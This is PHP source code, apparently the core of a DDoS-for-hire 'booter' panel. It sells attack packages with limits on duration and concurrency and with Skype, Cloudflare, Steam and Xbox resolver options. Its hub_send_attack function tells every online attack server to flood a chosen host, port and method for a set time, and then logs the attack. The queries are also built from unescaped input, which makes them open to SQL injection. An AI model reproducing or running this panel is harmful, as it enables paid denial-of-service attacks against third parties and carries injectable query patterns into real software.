<?php

class Core {
	function __construct($db) {
		$this->db = new DB($db);
		$this->xlog = new xLog($db);
	}
	function run_attacks() {
		return $this->db->num($this->db->query("SELECT * FROM `attacks` WHERE `end_date` > NOW()"));
	}
	function total_attacks() {
		return $this->db->num($this->db->query("SELECT * FROM `attacks`"));
	}
	function total_servs($op='online') {
		switch($op) {
			case 'online':
				$clause = "`online`='1'";
				break;
			case 'offline':
				$clause = "`online`='0'";
				break;
		}
		return $this->db->num($this->db->query("SELECT * FROM `servers` WHERE $clause"));
	}
	function total_packs() {
		return $this->db->num($this->db->query("SELECT * FROM `packages`"));
	}
	function create_package($data) {
		$name = $this->xlog->filter($_POST['pack_name']);
		$desc = $this->xlog->filter($_POST['pack_desc']);
		$max_attack = (int)($_POST['pack_maxattack']);
		$max_conc = (int)($_POST['pack_maxconc']);
		$length = (int)($_POST['pack_termnum']) . ' ' . $this->xlog->filter($_POST['pack_term']);
		$skype = (int)($_POST['skyperes']);
		$cf = (int)($_POST['cfres']);
		$tiny = (int)($_POST['tinyres']);
		$xbox = (int)($_POST['xboxres']);
		$steam = (int)($_POST['steamres']);
		$price = (int)($_POST['pack_price']);
		
		$vals = array($length, $max_attack, $max_conc, $skype, $cf, $tiny, $steam, $xbox, $price, $name, $desc);
		$nvals = array();
		foreach($vals as $v) {
			$nvals[] = "'" . $v . "'";
		}
		$vals = implode(', ', $nvals);
		$this->db->query("INSERT INTO `packages` (`length`, `max_attack_time`, `max_concurrent`, `res_skype`, `res_cf`, `res_tiny`, `res_steam`, `xbl_check`, `price`, `name`, `pub_desc`) VALUES ($vals)");
	}
	function del_pack($pid) {
		$pid = $this->xlog->filter($pid);
		$this->db->query("DELETE FROM `packages` WHERE `id`='$pid'");
	}
	function del_serv($sid) {
		$sid = $this->xlog->filter($sid);
		$this->db->query("DELETE FROM `servers` WHERE `id`='$sid'");
	}
	
	function int_res($val) {
		if($val == 1) {
			return 'success';
		} else {
			return 'danger';
		}
	}
	function int_level($val) {
		switch($val) {
			case 0:
				return 'Banned';
				break;
			case 1:
				return 'User';
				break;
			case 2:
				return 'Active User';
				break;
			case 5:
				return 'Admin';
				break;
		}
	}
	function hub_send_attack($vals) {
		$host = $vals['host'];
		$port = $vals['port'];
		$time = $vals['time'];
		$method = $vals['method'];
		
		$q = $this->db->query("SELECT * FROM `servers` WHERE `online`='1' ORDER BY `last_attack` DESC");
		$mh = curl_multi_init();								
		$handles = array();
		while($row = $this->db->fetch_array($q)) {
			$uri = $row['custom_uri'];
			$uri = str_replace('{IP}', $host, $uri);
			$uri = str_replace('{PORT}', $port, $uri);
			$uri = str_replace('{TIME}', $time, $uri);
			$uri = str_replace('{METHOD}', $method, $uri);
			
			$full = 'http://' . $row['ip'] . $uri;
			$ch = curl_init($full);
			curl_setopt($ch, CURLOPT_TIMEOUT, 5);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_multi_add_handle($mh, $ch);
			$handles[] = $ch;
		}
		do
		{
			curl_multi_exec($mh, $running);
			usleep(200000);
		} while ($running > 0);

		foreach($handles as $ch)
			curl_multi_remove_handle($mh, $ch);
			curl_multi_close($mh);
		
		$this->db->query("INSERT INTO `attacks` (`ip`, `port`, `time`, `method`, `uid`, `date`, `end_date`) VALUES ('$host', '$port', '$time', '$method', '$_SESSION[id]', NOW(), DATE_ADD(NOW(), INTERVAL $time SECOND))");
	}
	
	function check_perm($uid, $type) {
		$uinfo = $this->db->fetch_array($this->db->query("SELECT * FROM `users` WHERE `id`='$uid' LIMIT 1"));
		$pinfo = $this->db->fetch_array($this->db->query("SELECT * FROM `packages` WHERE `pid`='$uinfo[id]' LIMIT 1"));
		if($uinfo['level'] == 5) {
			return true;
		}
		switch($type) {
			case 'skype':
				return bool($pinfo['res_skype']);
				break;
			case 'cf':
				return bool($pinfo['res_cf']);
				break;
			case 'tiny':
				return bool($pinfo['res_tiny']);
				break;
			case 'steam':
				return bool($pinfo['res_steam']);
				break;
			case 'xbl':
				return bool($pinfo['xbl_check']);
				break;
		}
	}
	function is_online($host) {
		error_reporting(0);
		$port = 80;
		$wait_time = 1;
		if($fp = fsockopen($host, $port, $errCode, $errStr, $wait_time)){
			error_reporting(1); 
			return true;
		} else {
			error_reporting(1); 
			return false;
		} 
		fclose($fp);
	}
	function level_ops() {
		$q = $this->db->query("SELECT * FROM `users` WHERE `expiry` <= NOW() AND `level` > 1");
		while($row = $this->db->fetch_array($q)) {
			$this->db->query("UPDATE `users` SET `level`='1' WHERE `id`='$row[id]' AND `level` < '5'");
		}
	}
	function check_online() {
		$this->level_ops();
		$q = $this->db->query("SELECT * FROM `servers`");
		while($row = $this->db->fetch_array($q)) {
			if($this->is_online($row['ip']) == true) {
				$this->db->query("UPDATE `servers` SET `online`='1' WHERE `id`='$row[id]' LIMIT 1");
			} else {
				$this->db->query("UPDATE `servers` SET `online`='0' WHERE `id`='$row[id]' LIMIT 1");
			}
		}
	}
	function tickets($stat) {
		switch($stat) {
			case 'open':
				$q = $this->db->query("SELECT * FROM `tickets` WHERE `open`='1'");
				break;
			case 'closed':
				$q = $this->db->query("SELECT * FROM `tickets` WHERE `open`='0'");
				break;
			case 'all':
				$q = $this->db->query("SELECT * FROM `tickets`");
				break;
		}
		return $this->db->num($q);
	}
}
?>